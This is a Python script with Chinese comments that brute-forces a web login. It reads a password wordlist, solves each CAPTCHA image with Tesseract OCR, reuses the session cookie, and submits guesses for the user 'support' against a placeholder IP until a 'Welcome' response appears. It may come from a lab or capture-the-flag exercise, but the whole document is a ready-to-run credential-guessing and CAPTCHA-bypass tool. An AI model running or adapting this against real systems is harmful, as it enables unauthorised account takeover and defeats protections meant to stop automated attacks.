# -*- coding: utf-8 -*-
import requests
from PIL import Image
import pytesseract
from io import BytesIO

# 打開密碼文件並讀取密碼清單
with open('fasttrack.txt', 'r') as password_file:
    passwords = password_file.readlines()

# 登入頁面的 URL
login_url = 'http://X.X.X.X/login.php'

# 逐一嘗試不同的密碼
for password in passwords:
    password = password.strip()

    # 取得驗證碼圖片的 URL
    url = 'http://x.x.x.x/captcha.php'
    response = requests.get(url)

    # 讀取驗證碼圖片並取得 Cookie
    captcha_image = Image.open(BytesIO(response.content))
    cookie = response.headers['Set-Cookie']

    # 使用 pytesseract 辨識驗證碼
    captcha_text = pytesseract.image_to_string(captcha_image).strip()

    # 設定 POST 請求的參數
    payload = {
        'username': 'support',
        'password': password,
        'captcha': captcha_text
    }

    # 設定請求標頭，包含 Cookie
    headers = {
        'Cookie': cookie
    }

    # 印出 POST 請求的參數
    print(payload)

    # 發送登入請求
    response = requests.post(login_url, data=payload, headers=headers)

    # 檢查回應中是否包含 'Welcome' 或 'Invalid' 字樣
    if 'Welcome' in response.text:
        print(f"Login successful with password: {password}")
        break
    elif 'Invalid' in response.text:
        print(f"Login failed with password: {password}")
